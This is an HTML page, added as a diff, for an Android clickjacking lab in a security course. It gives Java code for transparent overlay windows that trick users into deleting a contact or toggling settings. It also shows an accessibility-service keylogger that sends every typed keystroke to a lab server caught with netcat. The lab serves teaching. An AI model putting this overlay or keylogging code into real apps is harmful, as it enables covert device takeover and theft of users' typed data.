@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Clickjacking Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Android Repackaging Attack Lab" href="repackaging.html" />
+    <link rel="prev" title="Mobile Security Labs" href="mobile_index.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="mobile_index.html">Mobile Security Labs</a><ul class="current">
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Clickjacking Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#lab-environment">Lab Environment</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-perform-a-clickjacking-attack">Task 1: Perform a Clickjacking attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-dangerous-accessibility-service-in-android">Task 2: Dangerous Accessibility Service in Android</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-3-design-your-clickjacking-attack">Task 3: Design your clickjacking attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission-and-demonstration">Submission and Demonstration</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="repackaging.html">Android Repackaging Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="rooting.html">Android Device Rooting Lab</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="mobile_index.html">Mobile Security Labs</a> &raquo;</li>
+        
+      <li>Clickjacking Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="center docutils container">
+<p>Clickjacking Attack Lab</p>
+</div>
+<div class="section" id="clickjacking-attack-lab">
+<h1>Clickjacking Attack Lab<a class="headerlink" href="#clickjacking-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>Clickjacking attack is a very common type of attack for most devices. In
+such an attack, attacker uses multiple transparent or opaque layers to
+trick a user into clicking on a button or link on another page when they
+were intending to click on the top level page. Users can be easily
+fooled, and do not even realise where they are really clicking.
+Attackers need user interaction to make this attack successful, hence
+they usually design clickjacking attack applications in the form of
+games or survery forms.</p>
+<p>The learning objective of this lab is for students to gain a first-hand
+experience in Clickjacking attack, so they can better understand this
+particular risk associated with Android systems, and be more cautious
+when downloading apps to their devices, especially from those untrusted
+third-party markets. In this lab, students will be asked to conduct a
+simple clickjacking attack and demonstrate it on our provided Android
+VM. Students will also see what damage can be done with a fully
+weaponized clickjacking attack.</p>
+<p>Students should be warned not to submit the clickjacking attack apps to
+any market, or they will face legal consequence. Nor should they run the
+attack on their own Android devices, as that may cause real damages.</p>
+<p>In order to conduct this attack, the attackers need only one permission,
+the “Permit drawing over other apps” permission. Once they have this, it
+is very difficult for users to catch the attack. Also, this permission
+is very commonly used in devices. Popular applications like the Music
+application, calling application, all use this permissions. Be very
+careful when giving an application this permission.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>All devices are vulnerable to this attack. Attacks on devices with Android version below 7.0 do not even require users permission to draw over other applications.</p>
+</div>
+</div>
+<div class="section" id="lab-environment">
+<h2>Lab Environment<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h2>
+<p>The lab requires two virtual machines, one is called SEEDAndroid, and
+the other is called SEEDUbuntu16.04. As the name indicates, the first VM
+is a virtual machine running Android operating system, and we need it to
+test our clickjacking attack. The second VM is a Ubuntu Linux virtual
+machine; all the tools needed for this lab, have already been installed
+the SEEDUbuntu VM. Both VMs and their user manuals can be downloaded
+from the SEED web site.</p>
+</div>
+<div class="section" id="task-1-perform-a-clickjacking-attack">
+<h2>Task 1: Perform a Clickjacking attack<a class="headerlink" href="#task-1-perform-a-clickjacking-attack" title="Permalink to this headline">¶</a></h2>
+<p>In this task we will demonstrate a clickjacking attack, where we will
+delete a contact. We have already designed an application which does a
+clickjacking attack and it is installed in your AndroidVM. Our
+application behaves as a Calibration phase before playing a game, it
+will ask you to click various button in order to complete the
+calibration for best user experience. What is actually happenning in the
+background is that we are deleting a contact. In order to perform this
+attack, we need to get the users permission for “Permit drawing over
+other apps”.</p>
+<div class="section" id="attack-code">
+<h3>Attack Code<a class="headerlink" href="#attack-code" title="Permalink to this headline">¶</a></h3>
+<div class="line-block">
+<div class="line">Before performing the attack, we will first talk about how we did this
+attack.</div>
+<div class="line">After getting the required permissions, we need to design views and
+overlay them on the page. We have to make sure to cover the whole page
+and make it possible to click through these views. So, when the user
+clicks, the click is actually happenning in the background of that
+view (which is not visible to the user). We control how wide or long
+the views are using coordinate values and have to position them
+perfectly.</div>
+</div>
+<ol class="arabic">
+<li><p>Step 1: We use an intent to open the page which closest to our goal,
+programitically. For example, to delete contacts we will open the
+contacts application first and then design our views.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>startStep1();
+Intent openContacts = new Intent(Intent.ACTION_DEFAULT,  ContactsContract.Contacts.CONTENT_URI);
+openContacts.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+openContacts.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
+openContacts.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
+openContacts.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+startActivity(openContacts);
+</pre></div>
+</div>
+<p>Here, the function <strong>startStep1()</strong> overlays our views for the first
+page. After, this create an intent which opens the contacts
+application in the background. So, the views defined by
+<strong>startStep1()</strong> are on top of the first page of the contacts
+applications. Consecutively, <strong>startStep1()</strong> will call
+<strong>startStep2()</strong>, <strong>startStep3()</strong> and so on, until we have performed
+the required tasks.</p>
+</li>
+<li><p>Step 2: The main work now is to design the views. While designing
+views we need to place the button exactly on top of where we want the
+user to click and cover the rest of the page with whitespace. This
+makes sure that the page in the background is not visible. We use
+Android WindowManager to add our views.</p>
+<p>Each view has a boolean value called “passthrough”. If this value is
+false, the users click will not go through to the background and vice
+versa. Only the view with our button has “passthrough” as true and
+the others have false, so that users don’t click somewhere else.</p>
+<p>Defining our views:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public OverlayOne(final ClickJacking service) {
+
+        mTextView = new TextView(service);
+        mTextView.setText(&quot;Calibration : &quot;);
+        mTextView.setBackgroundColor(ClickJacking.mMakeAttackVisible ? 0x66FF0000 : 0xFFFFFFFF);
+        mTextView.setTextColor(0xff000000);
+        mTextView.setTextSize(20f);
+        mTextView.setGravity(Gravity.CENTER);
+    }
+...
+public View getView() {
+        return mTextView;
+    }
+...
+public WindowManager.LayoutParams getParams() {
+        return ClickJacking.getParams(mRect, false);
+    }
+</pre></div>
+</div>
+<p>Here, we first define our textview.</p>
+<p>Here, function call <strong>ClickJacking.mMakeAttackVisible</strong> checks if the
+user has selected this option. If it is selected, the color schemes
+are changed and the overlays become visible to the users along with
+the background. We use this to show users the actual overlay and for
+debugging the views.</p>
+<p>Also, the function call <strong>ClickJacking.getParams</strong> return the
+coordinate values and the boolean “passthrough” value for this view.
+Each view has preset coordinates which are set using “mRect”.</p>
+<p>Refer to <strong>Figure 1</strong> and <strong>Figure 2</strong> to see the views with “Attack
+visible” toggled on and off.</p>
+<div class="align-center figure align-default" id="id3">
+<img alt="alternate text" src="../../_images/Figure2.png" />
+<p class="caption"><span class="caption-text">Figure 1: Attack visible toggled on</span><a class="headerlink" href="#id3" title="Permalink to this image">¶</a></p>
+</div>
+<div class="align-center figure align-default" id="id4">
+<img alt="alternate text" src="../../_images/Figure3.png" />
+<p class="caption"><span class="caption-text">Figure 2: Attack visible toggled off</span><a class="headerlink" href="#id4" title="Permalink to this image">¶</a></p>
+</div>
+</li>
+<li><p>Step 3: This is the step where we add our views. This is how our
+function <strong>startStep1()</strong> looks like:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public void startStep1() {
+       if (currentStep &gt; 0) return;
+       currentStep = 1;
+       addView(o1);
+       addView(o2);
+       addView(o3);
+   }
+</pre></div>
+</div>
+<p>Here we add all our views. Each view checks if all views are added
+and then invokes startStep2() and so on. startStep2() will add its
+new views and remove the old ones. This is how startStep2() looks:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public void startStep2() {
+      if (currentStep &gt; 1) return;
+      currentStep = 2;
+      addView(o5);
+      addView(o6);
+      new ViewRemover(this, o1).start();
+      new ViewRemover(this, o2).start();
+      new ViewRemover(this, o3).start();
+  }
+</pre></div>
+</div>
+<p><strong>addView</strong> and <strong>viewRemover</strong> are functions defined by us, which
+use Android WindowManager to set and remove views.</p>
+</li>
+<li><p>Step 4: addView() and viewRemover(): <strong>addView() :</strong></p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public void addView(ViewWithParams v) {
+       WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+       wm.addView(v.getView(), v.getParams());
+   }
+</pre></div>
+</div>
+<p>Here, we create a WindowManager object and call our functions
+getView() and getParams() to add the view.</p>
+<p>getView() returns the view we defined in Step 2.</p>
+<p>getParams() checks if the view is passthrough or not, and then sets
+the layoutParams :</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>  private static WindowManager.LayoutParams getAlertLP(Rect rect) {
+        WindowManager.LayoutParams lParams = new WindowManager.LayoutParams(
+                rect.right - rect.left,
+                rect.bottom - rect.top,
+                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
+                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                PixelFormat.TRANSLUCENT);
+        lParams.gravity = Gravity.TOP | Gravity.LEFT;
+        lParams.x = rect.left;
+        lParams.y = rect.top;
+        return lParams;
+    }
+
+NOTE :  &quot;WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH&quot;  is what allows us to click through the view. Incase, &quot;passthrough&quot; is false, we remove this attribute.
+</pre></div>
+</div>
+<p><strong>viewRemover() :</strong></p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public static void removeView(Context ctx, View view) {
+       WindowManager wm = (WindowManager) ctx.getSystemService(ctx.WINDOW_SERVICE);
+       wm.removeView(view);
+   }
+</pre></div>
+</div>
+</li>
+</ol>
+</div>
+<div class="section" id="performing-the-attack">
+<h3>Performing the Attack:<a class="headerlink" href="#performing-the-attack" title="Permalink to this headline">¶</a></h3>
+<p>Now we can perform the attack. This involves, two steps. Refer to figure
+3 to see how the application looks:</p>
+<ol class="arabic simple">
+<li><p>Step 1: Add a contact. We will delete this contact using the
+clickjacking attack.</p></li>
+<li><p>Step 2: Run the clickjacking application. Click on “ASK FOR
+PERMISSION” and it will take you to the permission page. Give that
+permission. Now, head back to the app and click on “START
+CLICKJACKING ATTACK”. Follow the steps and at the end you should see
+that the contact has been deleted.</p></li>
+<li><p>Additional: Now try to run the attack after toggling “Make attack
+visible” option. You should be able to see how the views have been
+overlayed on top of the contacts and get an idea of how the attack
+really works (make sure to add a new contact before trying again).</p></li>
+</ol>
+<div class="center docutils container">
+<div class="align-center figure align-default" id="id5">
+<img alt="alternate text" src="../../_images/Figure1.png" />
+<p class="caption"><span class="caption-text">Figure 3: Clickjacking Attack Application</span><a class="headerlink" href="#id5" title="Permalink to this image">¶</a></p>
+</div>
+</div>
+<p>Submit screenshots to prove you have done the attack.</p>
+</div>
+</div>
+<div class="section" id="task-2-dangerous-accessibility-service-in-android">
+<h2>Task 2: Dangerous Accessibility Service in Android<a class="headerlink" href="#task-2-dangerous-accessibility-service-in-android" title="Permalink to this headline">¶</a></h2>
+<p>One of the most dangerous services in the Android system is the
+accessibility service. If any application were to get access to the
+accessibility service, they would have full access to everything that
+happens on the device. That application will be able to capture
+keystrokes, actions, record each click or touch etc.</p>
+<p>In this task, we show you how dangerous an accessibility service
+permission can be and how the attackers can use the attack in task 1 to
+get the permissions for this service and gain full control.</p>
+<div class="section" id="attack-code-1">
+<span id="id1"></span><h3>Attack Code<a class="headerlink" href="#attack-code-1" title="Permalink to this headline">¶</a></h3>
+<p>Before performing the attack, we will first talk about how a legitimate
+application can use the accessibility service and how we use it in a
+malicious way.</p>
+<p><strong>Capturing events from accessibility service :</strong> After getting required
+permissions, we need to create a class which extends
+“AccessibilityService”. we can use an object of “AccessibilityEvent” to
+capture various different events and do with them as we please:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public class getAccessibilityEvent extends AccessibilityService {
+...
+public void onAccessibilityEvent(AccessibilityEvent event) {
+     Log.d(&quot;Event 1&quot;,event.getPackageName());
+     Log.d(&quot;Event 2&quot;,event.getText());
+     Log.d(&quot;Event 3&quot;,event.getPackageName());
+     Log.d(&quot;Event 4&quot;,event.getEventTime());
+...
+        }
+}
+</pre></div>
+</div>
+<p><strong>Malicious usage of the Accessibility service :</strong> One example of
+malicious usage could be to send out everything typed by the user to our
+server. In our application, we use a stringbuilder to concatenate
+everything typed by the user and repeatedly send this out to our server
+:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>public class getAccessibilityEvent extends AccessibilityService {
+...
+private String getEventText(AccessibilityEvent event) {
+            StringBuilder sb = new StringBuilder();
+            for (CharSequence s : event.getText()) {
+                sb.append(s);
+            }
+            return sb.toString();
+        }
+...
+ public void onAccessibilityEvent(AccessibilityEvent event) {
+            s = &quot;package=&quot; + event.getPackageName() + &quot;&amp;&quot; + &quot;text=&quot; + getEventText(event);
+            new SendData(s).execute();
+        }
+...
+}
+</pre></div>
+</div>
+<p><strong>SendData</strong> is a class which extends AsyncTask used to send data out of
+the device.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>class SendData extends AsyncTask&lt;String, Void, Void&gt; {
+    String s;
+    public SendData(String a)
+    {
+        s=a;
+    }
+    private Exception exception;
+    protected Void doInBackground(String... urls) {
+            URL url = null;
+            url = new URL(&quot;http://www.SeedLabClickjacking.com:7777&quot;);
+            HttpURLConnection urlConnection = null;
+            urlConnection = (HttpURLConnection) url.openConnection();
+            urlConnection.setDoOutput(true);
+            urlConnection.setChunkedStreamingMode(0);
+            OutputStream out = new BufferedOutputStream(urlConnection.getOutputStream());
+            out.write(s.getBytes());
+            out.flush();
+            urlConnection.disconnect();
+       }
+        return null;
+    }
+</pre></div>
+</div>
+</div>
+<div class="section" id="performing-the-attack-1">
+<span id="id2"></span><h3>Performing the Attack:<a class="headerlink" href="#performing-the-attack-1" title="Permalink to this headline">¶</a></h3>
+<p>Follow the steps below to perform the attack. We will need both the VM’s
+for this task.</p>
+<ol class="arabic">
+<li><p>Step 1: On your SEEDUbuntu machine, open a terminal and run the
+following command:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ nc -kl 7777
+</pre></div>
+</div>
+</li>
+<li><p>Step 2: On yourAndroidVM machine, you need to modify the
+/system/etc/hosts file and modify the IP address of
+“SeedLabsClickjacking.com” with the IP address of your SEEDUbuntu VM.
+In order to do this, we will use “adb push” and “adb pull”. On your
+SEEDUbuntu machine, do the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ adb root
+$ adb disconnect
+$ adb connect IP-OF-ANDROIDVM
+$ adb pull /system/etc/hosts
+$ vim hosts
+$ adb push hosts /system/etc/
+</pre></div>
+</div>
+</li>
+<li><p>Step 3: Give accessibility permissions to our applications. For this:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Go into settings -&gt; Accessibility -&gt; ClickJacking Attack -&gt; Toggle on -&gt; OK
+</pre></div>
+</div>
+</li>
+<li><p>Step 4: Play around in your AndroidVM and watch the SEEDUbuntu netcat
+session recieve everything you do. Try to type in the browser of the
+Android VM and you will be able to see each key being logged in our
+SEEDUbuntu machine.</p></li>
+</ol>
+<p>Refer to <strong>Figure 4</strong> to see how a keylog response looks like on our
+SEEDUbuntu machine.</p>
+<p>Everything we do in step 3 of this attack can be done using clickjacking
+attack. If attackers were to get your accessibility permission on their
+application, all your information could be leaked.</p>
+<div class="center docutils container">
+<div class="align-center figure align-default" id="id6">
+<img alt="alternate text" src="../../_images/Figure4.png" />
+<p class="caption"><span class="caption-text">Figure 4: Keylog Response on SEEDUbuntu</span><a class="headerlink" href="#id6" title="Permalink to this image">¶</a></p>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="task-3-design-your-clickjacking-attack">
+<h2>Task 3: Design your clickjacking attack<a class="headerlink" href="#task-3-design-your-clickjacking-attack" title="Permalink to this headline">¶</a></h2>
+<p>In this task, we will perform a clickjacking attack to turn the airplane
+mode off. We will give you the source code and you will have to allign
+the views by modifying the coordinates in the “setCoords” function
+inside the init() function of the ClickJacking class. Here is how
+setCoords looks :</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>...
+setCoords(1, 0, 0, 1024, 100);
+setCoords(2, -100, 100, 1024, 300);
+setCoords(3, 0, 400, 1024, 820);
+...
+</pre></div>
+</div>
+<p>The first attribute is the “viewId” which tells us the ID of the view we
+are modifying the coordinates for. In your activity, you have two views,
+OverlayOne() and OverlayTwo(). You just have to play with the
+coordinates of these views and align them perfectly. Debugging can be
+done using “Make Attack visible” option. Here is a little more
+information about setCoords:</p>
+<p><strong>Function setCoords(viewId, ax, ay, bx, by);</strong> Here, ax and ay define
+the position of the content inside your view. Example, a button or a
+textbox.</p>
+<p>Bx and by define the length and breadth of the view itself.</p>
+<p>For instance, in your task you will have to play with all 4 values with
+OverlayOne(), but only with bx and by for OverlayTwo() (since
+OverlayOne() contains the button).</p>
+<p>You will have to modify the code, recompile and “adb install” the
+application in the AndroidVM to test your changes. The only place you
+have to modify is “setCoords” values inside the “ClickJacking.java”
+file. Follow the guidelines given below to modify, recompile and install
+your applications (you will neeed both your VM’s for this task) :</p>
+<ul>
+<li><p>Step 1 : Download and unzip ClickJacking.zip file from our website</p></li>
+<li><p>Step 2: Locate the code files. Go to the folder
+app/src/main/java/seedlabs/clickjacking2 folder.</p></li>
+<li><p>Step 3: Here you should see ClickJacking.java. This is where you have
+to modify the coordinate values for our views.</p></li>
+<li><p>Step 4: After making the required modifications, build the
+application and get the .apk file. To build your app go into the root
+folder of the application and run :</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ chmod +x gradlew
+$ ./gradlew
+$ ./gradlew assembleDebug
+</pre></div>
+</div>
+<p>You can find the built .apk file in app/build/outputs/apk/</p>
+</li>
+<li><p>Step 5: Install the apk on the Android VM using :</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ adb disconnect
+$ adb connect IP-OF-ANDROIDVM
+$ adb install YOUR-APK.apk
+</pre></div>
+</div>
+</li>
+<li><p>Step 6: After installation, you should find an application with the
+name “Clickjacking Attack 2”</p></li>
+</ul>
+<p><strong>NOTE:</strong></p>
+<ul class="simple">
+<li><p>1 : You should first install the application on the AndroidVM without
+changes to get a feel of the views</p></li>
+<li><p>2: You have to delete the application from the AndroidVM before
+re-installing, everytime.</p></li>
+<li><p>3: You will probably have to modify, recompile and re-install
+multiple times before you can allign the views perfectly</p></li>
+</ul>
+</div>
+<div class="section" id="submission-and-demonstration">
+<h2>Submission and Demonstration<a class="headerlink" href="#submission-and-demonstration" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report to describe what you have done
+and what you have observed, including screenshots and code snippets (if
+needed). You also need to provide explanation to the observations that
+are interesting or surprising. You are encouraged to pursue further
+investigation, beyond what is required by the lab description.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="repackaging.html" class="btn btn-neutral float-right" title="Android Repackaging Attack Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="mobile_index.html" class="btn btn-neutral float-left" title="Mobile Security Labs" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
